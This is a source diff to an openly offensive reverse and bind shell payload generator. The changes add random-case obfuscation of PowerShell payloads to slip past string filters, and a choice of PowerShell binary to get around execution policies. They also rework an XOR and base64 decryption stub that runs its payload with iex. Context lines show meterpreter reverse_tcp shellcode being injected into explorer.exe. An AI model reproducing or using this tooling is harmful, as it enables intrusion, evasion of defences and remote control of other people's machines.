@@ -43,6 +43,38 @@ def alert(msg):
     return msg
 #=================
 
+def random_case_shuffle(data):
+    """
+    Use os.urandom() to randomly choose case from a ASCII byte-stream 
+    @zc00l
+    """
+    out = ""
+    for char in data:
+        out += char.upper() if ord(os.urandom(1)) % 2 == 0 else char.lower()
+    return out
+
+def powershell_wrapper(name, code, args):
+    """
+    --powershell-x86 and --powershell-x64
+    Choose which powershel.exe binary to use.
+    Useful when there is security policies restricting one, but not both.
+    @zc00l
+
+    --powershell-random-case
+    Randomly set the case in powershell payloads.
+    This might avoid some weak string filtering.
+    @zc00l
+    """
+
+    if args.powershell_x86 is True:
+        code = code.replace("powershell.exe", "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
+    elif args.powershell_x64 is True:
+        code = code.replace("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
+
+    if "powershell" in name.lower() and args.powershell_random_case is True:
+        code = random_case_shuffle(code) # apply random case if user requested.
+    return code
+
 def xor_wrapper(name, code, args, shell="/bin/bash"):
     if args.shell is not "":
         shell = args.shell
@@ -55,16 +87,16 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
         if "-Command" in code:
             prefix, xcode = code.split("-Command")
         else:
-            prefix = "poweshell.exe -nop -ep bypass "
+            prefix = "powershell.exe -nop -ep bypass "
             xcode = code
-        pcode = xcode.replace("'", "")
-        pcode = pcode.replace("\\", "")
+        pcode = xcode.replace('"', "")
+        #pcode = pcode.replace("\\", '\\"')
         
         code = to_unicode(pcode) # String to Unicode
         code = xor(code, args.xor) # XOR encode using random key <--
         code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
-        code = """$k={0};$b=\\"{1}\\";$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
-        code= prefix + "-Command " + "'%s'" % code
+        code = """ $k={0};$b='{1}';$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
+        code= prefix + "-Command " + '"%s"' % code
     return code
 
 def base64_wrapper(name, code, args,shell="/bin/bash"):
@@ -77,15 +109,18 @@ def base64_wrapper(name, code, args,shell="/bin/bash"):
         else:
             # Powershell encoding code
             # Improved code in 0.3.6
-            if "-Command" in code:
-                prefix, xcode = code.split("-Command")
+            if "-command" in code.lower():
+                prefix, xcode = str(code.lower()).split("-command") if args.powershell_random_case is True else code.split("-Command")
             else:
                 prefix = "powershell.exe -nop -ep bypass "
                 xcode = code
             
-            pcode = xcode.replace("'", "") # Remove single quotes from -Command
-            pcode = pcode.replace("\\", "") # remove string quotation
-            code = prefix + "-Encoded " + powershell_base64(pcode)
+            pcode = xcode.replace('"', "") # Remove double quotes from -Command
+            #pcode = pcode.replace("\\", "") # remove string quotation
+
+            # It is needed to random case again, if the user chose to random-case.
+            pcode = powershell_wrapper(name, pcode, args)
+            code = prefix + "-Encoded " + powershell_base64(pcode[1:])
     return code
 
 
@@ -134,11 +169,15 @@ class ReverseShell(object):
         Generate the code.
         Apply encoding, in the correct order, of course.
         """
+
         # Update of 0.3.6
         # Some custom shells will not need TARGET and PORT strings.
         # To deal with that, I will just try to find them in the string first.
         if "TARGET" in self.code and "PORT" in self.code:
             self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
+            
+            # Apply powershell-tuning if set in args.
+            self.code = powershell_wrapper(self.name, self.code, self.args)
         else:
             # Custom shell. Here we need to program individually based in specifics.
             if "bloodseeker" in self.name.lower(): # This is for Bloodseeker project.
@@ -152,12 +191,10 @@ class ReverseShell(object):
                 malicious_script = str(WINDOWS_BLOODSEEKER_SCRIPT.decode("base64")).replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))
                 self.code = malicious_script.replace("PROCESSNAME", "explorer") # we want inject into explorer.exe
                 print(alert("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening in your machine."))
-                print(alert("It is recommended to use the --base64 flag."))
                 return self.code # we dont need encoder in this one.
             else:
                 print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                 exit(1)
-
         
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
@@ -184,7 +221,11 @@ class BindShell(object):
         Generate the code.
         Apply encoding, in the correct order, of course.
         """
+        # Set connection data to the code.
         self.code = self.code.replace("PORT", str(self.port))
+
+        # Apply powershell-tuning if set in args.
+        self.code = powershell_wrapper(self.name, self.code, self.args)
 
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
